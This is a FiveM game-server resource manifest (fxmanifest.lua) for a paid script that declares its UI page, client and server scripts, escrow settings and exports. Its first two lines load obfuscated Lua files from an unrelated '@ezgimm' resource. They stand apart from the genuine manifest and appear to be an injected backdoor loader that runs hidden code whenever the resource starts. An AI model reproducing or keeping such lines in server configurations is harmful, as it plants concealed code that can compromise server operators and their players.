shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'


fx_version 'cerulean'
game 'gta5'
lua54 'yes'

author "Savana Scripts"
description 'savana.tebex.io'

shared_script {
	'@ox_lib/init.lua',
	"config.lua"
}

ui_page {
	'html/index.html'
}

files {
    'html/**/**.**'
}

client_scripts {
	'utils/client.lua',
	'utils/mugshot.lua',
	'client/*.lua',
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'utils/server.lua',
	'server/*.lua',
}

escrow_ignore {
    'config.lua',
	'utils/*.lua'
}

dependencies {
    'ox_lib'
}

exports {
    'openMenu',
	'openDashboard'
}
dependency '/assetpacks'